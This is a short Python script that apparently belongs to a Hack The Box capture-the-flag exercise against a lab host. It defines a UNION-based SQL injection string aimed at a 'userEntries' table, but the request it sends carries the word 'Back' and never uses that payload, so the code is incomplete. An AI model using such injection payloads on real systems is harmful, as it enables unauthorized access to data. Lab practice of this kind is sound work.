import requests

hostUrl = "http://178.62.96.143:30852/"
q = "HTB UNION SELECT * FROM userEntries WHERE 1='1"
r = requests.get(hostUrl + "entries", data={"q": "Back"})

print(r.text + "\n")
print(r.request)